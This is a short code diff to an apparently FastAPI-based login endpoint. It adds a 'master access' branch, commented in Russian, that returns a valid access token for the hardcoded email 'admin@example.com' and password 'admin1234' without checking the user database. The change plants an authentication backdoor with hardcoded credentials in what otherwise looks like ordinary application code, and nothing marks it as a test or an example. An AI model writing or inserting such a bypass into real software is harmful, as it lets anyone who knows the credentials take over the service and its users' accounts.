@@ -15,8 +15,15 @@ async def register(user: UserCreate):
 
 @router.post("/login")
 async def login(user: UserLogin):
+    # 🔐 Мастер-доступ
+    if user.email == "admin@example.com" and user.password == "admin1234":
+        token = create_access_token({"sub": user.email})
+        return {"access_token": token, "token_type": "bearer"}
+
+    # Обычная проверка из базы
     user_db = await verify_user(user.email, user.password)
     if not user_db:
         raise HTTPException(status_code=401, detail="Invalid credentials")
+
     token = create_access_token({"sub": user_db.email})
     return {"access_token": token, "token_type": "bearer"}
